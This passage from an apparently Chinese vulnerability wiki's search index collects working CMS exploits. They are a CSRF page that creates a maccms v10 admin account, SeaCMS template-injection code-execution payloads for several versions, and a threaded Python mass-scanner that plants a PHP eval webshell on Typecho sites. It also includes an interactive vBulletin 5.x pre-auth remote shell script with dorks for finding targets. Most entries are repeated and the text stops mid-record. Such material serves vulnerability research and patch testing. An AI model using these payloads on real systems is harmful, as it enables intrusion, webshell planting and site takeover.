\u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 maccms_v10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u4efb\u610f\u8d26\u53f7 2018-06-11 Bay0net http://www.maccms.com/ http://www.maccms.com/down.html v10 CVE-2018-12114 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2aHtml\u9875\u9762\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u5bf9\u7f51\u7ad9\u8fdb\u884c\u5165\u4fb5\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 exp\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://10.211.55.17/maccms10/admin.php/admin/admin/info.html\" method = \"POST\" > < input type = \"hidden\" name = \"admin_id\" value = \"\" /> < input type = \"hidden\" name = \"admin_name\" value = \"test2\" /> < input type = \"hidden\" name = \"admin_pwd\" value = \"test2\" /> < input type = \"hidden\" name = \"admin_status\" value = \"1\" /> < input type = \"hidden\" name = \"admin_auth[0]\" value = \"index/welcome\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"maccms v10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u4efb\u610f\u8d26\u53f7"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 maccms_v10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u4efb\u610f\u8d26\u53f7 2018-06-11 Bay0net http://www.maccms.com/ http://www.maccms.com/down.html v10 CVE-2018-12114","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/#_2","text":"\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2aHtml\u9875\u9762\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u5bf9\u7f51\u7ad9\u8fdb\u884c\u5165\u4fb5\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/#poc","text":"exp\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://10.211.55.17/maccms10/admin.php/admin/admin/info.html\" method = \"POST\" > < input type = \"hidden\" name = \"admin_id\" value = \"\" /> < input type = \"hidden\" name = \"admin_name\" value = \"test2\" /> < input type = \"hidden\" name = \"admin_pwd\" value = \"test2\" /> < input type = \"hidden\" name = \"admin_status\" value = \"1\" /> < input type = \"hidden\" name = \"admin_auth[0]\" value = \"index/welcome\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"Affected Version 6.45 \u00b6 \u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5\uff1a https://pan.baidu.com/s/1uw_VnxnvG4GGEae4TRsGGw \u5bc6\u7801\uff1acd48 POC \u00b6 http://127.0.0.1/seacms645/search.php post:searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if} References \u00b6 https://bbs.ichunqiu.com/thread-35085-1-1.html\u00df http://0day5.com/archives/4249/ https://blog.csdn.net/qq_35078631/article/details/76595817","title":"SeaCMS v6.45\u524d\u53f0Getshell \u4ee3\u7801\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#affected-version-645","text":"\u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5\uff1a https://pan.baidu.com/s/1uw_VnxnvG4GGEae4TRsGGw \u5bc6\u7801\uff1acd48","title":"Affected Version 6.45"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","text":"http://127.0.0.1/seacms645/search.php post:searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if}","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#references","text":"https://bbs.ichunqiu.com/thread-35085-1-1.html\u00df http://0day5.com/archives/4249/ https://blog.csdn.net/qq_35078631/article/details/76595817","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"Affected Version 6.54 \u00b6 \u94fe\u63a5: https://pan.baidu.com/s/16rV0_xnoN_8-v4WVpCq6YA \u5bc6\u7801:qlwh 6.54 \u548c6.53\u7248\u672c\u7684\u4e0d\u540c\u4e4b\u5904\u662f\u5728\uff1a search.php \u768465\u884c\u7684 order \u53c2\u6570\u505a\u4e86\u9650\u5236\u3002 $order = ($order == \"commend\" || $order == \"time\" || $order == \"hit\") ? $order : \"\"; \u66f4\u65b0\u65e5\u671f\uff1a2017\u5e748\u67087\u65e5 v6.54 \u4fee\u590d\uff1a\u7d27\u6025\u4fee\u590d2\u5904\u9ad8\u5371\u5b89\u5168\u6f0f\u6d1e \u66f4\u65b0\u65e5\u671f\uff1a2017\u5e748\u67086\u65e5 v6.53 \u65b0\u589e\uff1a\u5fae\u4fe1\u516c\u4f17\u5e73\u53f0\u6a21\u5757 \u4f18\u5316\uff1a\u91c7\u96c6\u903b\u8f91 \u4fee\u590d\uff1a\u90e8\u5206\u6587\u5b57\u63cf\u8ff0\u9519\u8bef \u66f4\u65b0\u65e5\u671f\uff1a2017\u5e742\u670818\u65e5 v6.46 \u4fee\u590d\uff1a\u4e24\u5904\u5b89\u5168\u95ee\u9898 \u66f4\u65b0\u65e5\u671f\uff1a2017\u5e742\u67086\u65e5 v6.45 \u4fee\u590d\uff1a\u4e00\u5904\u5b89\u5168\u95ee\u9898 \u200b POC \u00b6 http://192.168.0.6/seacms654/search.php POST\uff1a searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo(); References \u00b6 \u6f0f\u6d1e\u9884\u8b66 | \u6d77\u6d0bCMS\uff08SEACMS\uff090day\u6f0f\u6d1e\u9884\u8b66","title":"Seacms6.54\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#affected-version-654","text":"\u94fe\u63a5: https://pan.baidu.com/s/16rV0_xnoN_8-v4WVpCq6YA \u5bc6\u7801:qlwh 6.54 \u548c6.53\u7248\u672c\u7684\u4e0d\u540c\u4e4b\u5904\u662f\u5728\uff1a search.php \u768465\u884c\u7684 order \u53c2\u6570\u505a\u4e86\u9650\u5236\u3002 $order = ($order == \"commend\" || $order == \"time\" || $order == \"hit\") ? $order : \"\"; \u66f4\u65b0\u65e5\u671f\uff1a2017\u5e748\u67087\u65e5 v6.54 \u4fee\u590d\uff1a\u7d27\u6025\u4fee\u590d2\u5904\u9ad8\u5371\u5b89\u5168\u6f0f\u6d1e \u66f4\u65b0\u65e5\u671f\uff1a2017\u5e748\u67086\u65e5 v6.53 \u65b0\u589e\uff1a\u5fae\u4fe1\u516c\u4f17\u5e73\u53f0\u6a21\u5757 \u4f18\u5316\uff1a\u91c7\u96c6\u903b\u8f91 \u4fee\u590d\uff1a\u90e8\u5206\u6587\u5b57\u63cf\u8ff0\u9519\u8bef \u66f4\u65b0\u65e5\u671f\uff1a2017\u5e742\u670818\u65e5 v6.46 \u4fee\u590d\uff1a\u4e24\u5904\u5b89\u5168\u95ee\u9898 \u66f4\u65b0\u65e5\u671f\uff1a2017\u5e742\u67086\u65e5 v6.45 \u4fee\u590d\uff1a\u4e00\u5904\u5b89\u5168\u95ee\u9898 \u200b","title":"Affected Version 6.54"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","text":"http://192.168.0.6/seacms654/search.php POST\uff1a searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#references","text":"\u6f0f\u6d1e\u9884\u8b66 | \u6d77\u6d0bCMS\uff08SEACMS\uff090day\u6f0f\u6d1e\u9884\u8b66","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"Affected Version 6.55 \u00b6 \u94fe\u63a5: https://pan.baidu.com/s/1UmbsQjQ4o4JFtK1MLHtf3g \u5bc6\u7801:k4x1 POC \u00b6 http://192.168.0.6/seacms655/search.php?phpinfo(); post: searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/* References \u00b6 \u6d77\u6d0bCMS\uff08SEACMS\uff09\u65b0\u7248\u672cV6.55\u8865\u4e01\u4ecd\u53ef\u88ab\u7ed5\u8fc7\u6267\u884c\u4efb\u610f\u4ee3\u7801 seacms 6.55 \u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e","title":"Seacms6.55\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#affected-version-655","text":"\u94fe\u63a5: https://pan.baidu.com/s/1UmbsQjQ4o4JFtK1MLHtf3g \u5bc6\u7801:k4x1","title":"Affected Version 6.55"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","text":"http://192.168.0.6/seacms655/search.php?phpinfo(); post: searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#references","text":"\u6d77\u6d0bCMS\uff08SEACMS\uff09\u65b0\u7248\u672cV6.55\u8865\u4e01\u4ecd\u53ef\u88ab\u7ed5\u8fc7\u6267\u884c\u4efb\u610f\u4ee3\u7801 seacms 6.55 \u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/","text":"Affected Version 6.61 \u00b6 POC \u00b6 \u540e\u53f0\u7684\u2192\u6dfb\u52a0\u5f71\u7247\u2192 \u56fe\u7247\u5730\u5740\u2192payload {if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//}{end if} \u8bbf\u95ee http://192.168.0.6/seacms661/detail/?1.html&a=assert&b=phpinfo(); http://192.168.0.6/seacms661/search.php?searchtype=5&tid=0&a=assert&b=phpinfo(); References \u00b6 seacms backend getshell CVE-2018-14421\u2014\u2014Seacms\u540e\u53f0getshell\u5206\u6790","title":"Seacms6.61\u540e\u53f0getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/#affected-version-661","text":"","title":"Affected Version 6.61"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/#poc","text":"\u540e\u53f0\u7684\u2192\u6dfb\u52a0\u5f71\u7247\u2192 \u56fe\u7247\u5730\u5740\u2192payload {if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//}{end if} \u8bbf\u95ee http://192.168.0.6/seacms661/detail/?1.html&a=assert&b=phpinfo(); http://192.168.0.6/seacms661/search.php?searchtype=5&tid=0&a=assert&b=phpinfo();","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/#references","text":"seacms backend getshell CVE-2018-14421\u2014\u2014Seacms\u540e\u53f0getshell\u5206\u6790","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/typeecho/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","text":"typecho\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 POC\u68c0\u6d4b\u4ee3\u7801 \u00b6 #/usr/bin/env python # -*- coding: UTF-8 -*- import getopt , sys import requests import sys import string import time import threading class check ( threading . Thread ): def __init__ ( self , url , sem ): super ( check , self ) . __init__ () #\u7ee7\u627fthreading\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cpython3\u7684\u5199\u6cd5super().__init__() self . url = url self . sem = sem def run ( self ): headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0' , 'Referer' : self . url , 'cookie' : \"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==\" } try : reqs = s . get ( self . url , timeout = 3 , headers = headers , allow_redirects = False ) #print(reqs.status_code), except IOError : #\u5982\u679c\u7f51\u7ad9\u6253\u4e0d\u5f00\u5c06\u8f93\u51fafail print ( \"time out 1\" ) urls = self . url + \"/p0.php\" urlsss = self . url + \"/install.php?finish=1\" payloads = { 'p0' : 'echo \"sectest\";' } try : reqss = s . post ( urls , allow_redirects = False , timeout = 3 , data = payloads ) #\u6d4b\u8bd5\u662f\u5426\u6587\u4ef6\u521b\u5efa\u6210\u529f body = reqss . text if body . find ( 'sectest' ) !=- 1 : print ( \"web is success----->>>>>>\" + self . url ) with open ( \"./success.txt\" , \"a+\" ) as f1 : f1 . write ( self . url + \" \\n \" ) else : print ( \"web is fail-------->>>>>>\" + self . url ) print ( ' \\n ' ) except IOError : #\u5982\u679c\u7f51\u7ad9\u6253\u4e0d\u5f00\u5c06\u8f93\u51fafail print ( \"time out 2\" ) self . sem . release () if __name__ == '__main__' : reload ( sys ) #\u540c\u4e0b\u89e3\u51b3\u4e2d\u6587\u4e71\u7801 sys . setdefaultencoding ( 'utf-8' ) #\u89e3\u51b3\u4e2d\u6587\u4e71\u7801 f = open ( \"./1.txt\" ) #\u6253\u5f00\u6279\u91cf\u626b\u63cf\u7684\u7f51\u7ad9\u6587\u4ef6 s = requests . Session () sem = threading . Semaphore ( 10 ) #\u6700\u5927\u7ebf\u7a0b\u6570\u4e3a10\u4e2a for line in f . readlines (): #\u8bfb\u53d6\u6bcf\u4e00\u884c\u7684\u7f51\u7ad9 line = line . strip ( ' \\n ' ) #\u6d88\u53bb\u6362\u884c url = line #\u6bcf\u884c\u7684\u7f51\u7ad9\u8d4b\u503c\u7ed9url host_thread = check ( url , sem ) host_thread . start () #\u6267\u884ccheck()\u7684\u6267\u884c\u51fd\u6570 \u4f7f\u7528\u65b9\u6cd5\uff1a\u5728\u5f53\u524d\u9875\u9762\u4e0b\u521b\u5efa./1.txt\uff08\u4e3a\u9700\u8981\u68c0\u6d4b\u7684url\uff09\uff0csuccess.txt\u4e3a\u542b\u6709\u6f0f\u6d1e\u7684url\u3002","title":"Typecho\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/typeecho/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#typecho","text":"","title":"typecho\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/typeecho/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#poc","text":"#/usr/bin/env python # -*- coding: UTF-8 -*- import getopt , sys import requests import sys import string import time import threading class check ( threading . Thread ): def __init__ ( self , url , sem ): super ( check , self ) . __init__ () #\u7ee7\u627fthreading\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cpython3\u7684\u5199\u6cd5super().__init__() self . url = url self . sem = sem def run ( self ): headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0' , 'Referer' : self . url , 'cookie' : \"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==\" } try : reqs = s . get ( self . url , timeout = 3 , headers = headers , allow_redirects = False ) #print(reqs.status_code), except IOError : #\u5982\u679c\u7f51\u7ad9\u6253\u4e0d\u5f00\u5c06\u8f93\u51fafail print ( \"time out 1\" ) urls = self . url + \"/p0.php\" urlsss = self . url + \"/install.php?finish=1\" payloads = { 'p0' : 'echo \"sectest\";' } try : reqss = s . post ( urls , allow_redirects = False , timeout = 3 , data = payloads ) #\u6d4b\u8bd5\u662f\u5426\u6587\u4ef6\u521b\u5efa\u6210\u529f body = reqss . text if body . find ( 'sectest' ) !=- 1 : print ( \"web is success----->>>>>>\" + self . url ) with open ( \"./success.txt\" , \"a+\" ) as f1 : f1 . write ( self . url + \" \\n \" ) else : print ( \"web is fail-------->>>>>>\" + self . url ) print ( ' \\n ' ) except IOError : #\u5982\u679c\u7f51\u7ad9\u6253\u4e0d\u5f00\u5c06\u8f93\u51fafail print ( \"time out 2\" ) self . sem . release () if __name__ == '__main__' : reload ( sys ) #\u540c\u4e0b\u89e3\u51b3\u4e2d\u6587\u4e71\u7801 sys . setdefaultencoding ( 'utf-8' ) #\u89e3\u51b3\u4e2d\u6587\u4e71\u7801 f = open ( \"./1.txt\" ) #\u6253\u5f00\u6279\u91cf\u626b\u63cf\u7684\u7f51\u7ad9\u6587\u4ef6 s = requests . Session () sem = threading . Semaphore ( 10 ) #\u6700\u5927\u7ebf\u7a0b\u6570\u4e3a10\u4e2a for line in f . readlines (): #\u8bfb\u53d6\u6bcf\u4e00\u884c\u7684\u7f51\u7ad9 line = line . strip ( ' \\n ' ) #\u6d88\u53bb\u6362\u884c url = line #\u6bcf\u884c\u7684\u7f51\u7ad9\u8d4b\u503c\u7ed9url host_thread = check ( url , sem ) host_thread . start () #\u6267\u884ccheck()\u7684\u6267\u884c\u51fd\u6570 \u4f7f\u7528\u65b9\u6cd5\uff1a\u5728\u5f53\u524d\u9875\u9762\u4e0b\u521b\u5efa./1.txt\uff08\u4e3a\u9700\u8981\u68c0\u6d4b\u7684url\uff09\uff0csuccess.txt\u4e3a\u542b\u6709\u6f0f\u6d1e\u7684url\u3002","title":"POC\u68c0\u6d4b\u4ee3\u7801"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/","text":"\u524d\u8a00 \u00b6 vBulletin \u662f\u4e00\u4e2a\u5546\u7528\u7684\u8bba\u575b\u7a0b\u5e8f\uff0c\u5728\u5168\u7403\u62e5\u6709\u6570\u4e07\u7528\u6237\u4e14\u589e\u957f\u901f\u5ea6\u5f88\u5feb\u3002\u8be5\u8bba\u575b\u91c7\u7528PHP Web\u8bed\u8a00\u53caMySQL\u6570\u636e\u5e93\u7684\u65b9\u5f0f\u8fdb\u884c\u67b6\u6784\u3002\u300a\u8d22\u5bcc\u300b 500\u5f3a\u548cAlexa\u6392\u540d\u524d100\u4e07\u7684\u516c\u53f8\u7f51\u7ad9\u5927\u90e8\u5206\u90fd\u5728\u4f7f\u7528\u7684\u4e00\u6b3e\u4e92\u8054\u7f51\u8bba\u575b\u7a0b\u5e8f\u3002 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 CVE-2019-16759 vBulletin 5.x 0day pre-auth RCE exploit \uff0c\u65e0\u9700\u9884\u8ba4\u8bc1\u5373\u53ef\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u4e0d\u9700\u8981\u5728\u76ee\u6807\u8bba\u575b\u4e0a\u6ce8\u518c\u5e10\u6237,\u5373\u53ef\u5728\u8fd0\u884cvBulletin\u5b89\u88c5\u7684\u670d\u52a1\u5668\u4e0a\u6267\u884cshell\u547d\u4ee4 \u5f71\u54cd\u8303\u56f4 \u00b6 \u4ea7\u54c1 \u00b6 vBulletin 5.x \u7248\u672c \u00b6 vBulletin v5\uff085.0.0\u52305.5.4\uff09\u7248\u672c \u7ec4\u4ef6 \u00b6 vBulletin \u6f0f\u6d1e\u590d\u73b0 \u00b6 POC \u00b6 #!/usr/bin/python # # vBulletin 5.x 0day pre-auth RCE exploit # # This should work on all versions from 5.0.0 till 5.5.4 # # Google Dorks: # - site:*.vbulletin.net # - \"Powered by vBulletin Version 5.5.4\" import requests import sys if len ( sys . argv ) != 2 : sys . exit ( \"Usage: %s <URL to vBulletin>\" % sys . argv [ 0 ]) proxies = { \"http\" : \"http://127.0.0.1:8080/\" } params = { \"routestring\" : \"ajax/render/widget_php\" } while True : try : cmd = raw_input ( \">>>Shell= \" ) params [ \"widgetConfig[code]\" ] = \"echo shell_exec('\" + cmd + \"');echo md5('vBulletin'); exit;\" r = requests . post ( url = sys . argv [ 1 ], data = params , proxies = proxies ) if r . status_code == 200 or r . status_code == 403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r . text : print print r . text . split ( 'be4ea51d962be8308a0099ae1eb3ec63' )[ 0 ] else : sys . exit ( \"Exploit failed! :(\" ) except KeyboardInterrupt : sys . exit ( \" \\n Closing shell...\" ) except Exception , e : sys . exit ( str ( e )) \u00b6","title":"CVE 2019 16759 vBulletin 5.x 0day pre auth RCE exploit"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_1","text":"vBulletin \u662f\u4e00\u4e2a\u5546\u7528\u7684\u8bba\u575b\u7a0b\u5e8f\uff0c\u5728\u5168\u7403\u62e5\u6709\u6570\u4e07\u7528\u6237\u4e14\u589e\u957f\u901f\u5ea6\u5f88\u5feb\u3002\u8be5\u8bba\u575b\u91c7\u7528PHP Web\u8bed\u8a00\u53caMySQL\u6570\u636e\u5e93\u7684\u65b9\u5f0f\u8fdb\u884c\u67b6\u6784\u3002\u300a\u8d22\u5bcc\u300b 500\u5f3a\u548cAlexa\u6392\u540d\u524d100\u4e07\u7684\u516c\u53f8\u7f51\u7ad9\u5927\u90e8\u5206\u90fd\u5728\u4f7f\u7528\u7684\u4e00\u6b3e\u4e92\u8054\u7f51\u8bba\u575b\u7a0b\u5e8f\u3002","title":"\u524d\u8a00"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_2","text":"CVE-2019-16759 vBulletin 5.x 0day pre-auth RCE exploit \uff0c\u65e0\u9700\u9884\u8ba4\u8bc1\u5373\u53ef\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_3","text":"\u4e0d\u9700\u8981\u5728\u76ee\u6807\u8bba\u575b\u4e0a\u6ce8\u518c\u5e10\u6237,\u5373\u53ef\u5728\u8fd0\u884cvBulletin\u5b89\u88c5\u7684\u670d\u52a1\u5668\u4e0a\u6267\u884cshell\u547d\u4ee4","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_4","text":"","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_5","text":"vBulletin 5.x","title":"\u4ea7\u54c1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_6","text":"vBulletin v5\uff085.0.0\u52305.5.4\uff09\u7248\u672c","title":"\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_7","text":"vBulletin","title":"\u7ec4\u4ef6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_8","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#poc","text":"#!/usr/bin/python # # vBulletin 5.x 0day pre-auth RCE exploit # # This should work on all versions from 5.0.0 till 5.5.4 # # Google Dorks: # - site:*.vbulletin.net # - \"Powered by vBulletin Version 5.5.4\" import requests import sys if len ( sys . argv ) != 2 : sys . exit ( \"Usage: %s <URL to vBulletin>\" % sys . argv [ 0 ]) proxies = { \"http\" 